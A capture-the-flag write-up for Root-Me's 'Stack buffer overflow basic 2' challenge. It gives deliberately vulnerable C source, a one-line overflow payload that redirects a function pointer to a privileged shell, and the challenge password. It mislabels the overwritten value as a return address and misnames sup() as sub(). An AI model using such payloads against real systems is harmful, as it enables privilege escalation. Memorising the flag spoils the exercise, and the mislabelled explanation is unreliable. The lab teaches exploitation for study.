# ELF x86 - Stack buffer overflow basic 2
- Point: 10pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en), 10 April 2015
- Level: Very Easy
- Statement
- Environment configuration <br>
```
  PIE	    Position Independent Executable	 ✘ 
  RelRO	    Read Only relocations	         ✘ 
  NX	    Non-Executable Stack	         ✔ 
  Heap exec Non-Executable Heap	                 ✔ 
  ASLR	    Address Space Layout Randomization	 ✘ 
  SF	    Source Fortification	         ✘ 
  SSP	    Stack-Smashing Protection            ✘
  SRC	    Source code access	                 ✔ 
```
## Write-up:
Code:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
## Write-up:
- As a normal code flow, the program will point to the address of **sub()** function and execute it. So we need to override the "ret addr" and point it to **shell()** function. 
- First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function.  
### Solution:
Payload: (python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15
Password: B33r1sSoG0oD4y0urBr4iN

